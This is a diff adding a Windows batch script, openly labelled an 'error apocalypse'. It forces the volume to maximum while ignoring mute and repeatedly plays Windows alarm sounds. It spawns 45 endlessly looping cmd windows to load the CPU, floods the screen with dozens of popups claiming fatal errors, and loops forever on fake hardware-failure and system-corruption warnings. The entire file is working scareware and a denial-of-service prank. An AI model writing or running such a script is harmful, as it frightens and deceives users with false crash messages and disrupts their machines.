@@ -1,0 +1,32 @@
+@echo off
+rem =====================================
+rem VOLUME 100% + ERROR APOCALYPSE
+rem =====================================
+
+REM FORCE MAX VOLUME (IGNORES MUTE!)
+powershell -Command "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Volume{ [DllImport(\"winmm.dll\")] public static extern int waveOutSetVolume(IntPtr hwo, uint dwVolume); }'; [Volume]::waveOutSetVolume([IntPtr]::Zero, 0xFFFF);"
+
+REM FULLSCREEN + CRITICAL ALERT (MAX VOLUME)
+powershell -WindowStyle Maximized -Command "$h=(Get-Host).UI.RawUI;$max=$h.MaxWindowSize;$h.WindowSize=$max;$h.BufferSize=$max;"
+powershell -c "1..20 | % { (New-Object Media.SoundPlayer 'C:\Windows\Media\Windows Critical Stop.wav').PlaySync(); Start-Sleep -m 100 };"
+
+title SYSTEM CRASH - VOLUME MAX
+color 4C
+mode con: cols=999 lines=999
+
+REM CPU MELTDOWN (45 PROCESSES)
+for /l %%i in (1,1,45) do start /max cmd /c "color 4C & title CPU%%i & for /l %%%%a in (1,0,2) do ping -n 1 127.0.0.1 >nul"
+
+REM 60 ULTRA-FAST RED X POPUPS (0.1s flood!)
+for /l %%i in (1,1,60) do (
+    start /min cmd /c "timeout /t 1 >nul & msg * /time:0 \"FATAL ERROR %%i - VOLUME MAXED\" & msg * /time:0 \"CRITICAL: 0x%RANDOM% - SOUND ALERT\""
+    powershell -c "Start-Sleep -Milliseconds 100;"
+)
+
+:ultimate_chaos
+msg * "HARDWARE FAILURE - SPEAKERS AT 100%"
+msg * "SYSTEM CORRUPTION - IMMEDIATE SHUTDOWN"
+msg * "ERROR: Audio driver crashed"
+powershell -c "(New-Object Media.SoundPlayer 'C:\Windows\Media\Windows Hardware Removed.wav').PlaySync();"
+timeout /t 1 >nul 2>nul
+goto ultimate_chaos
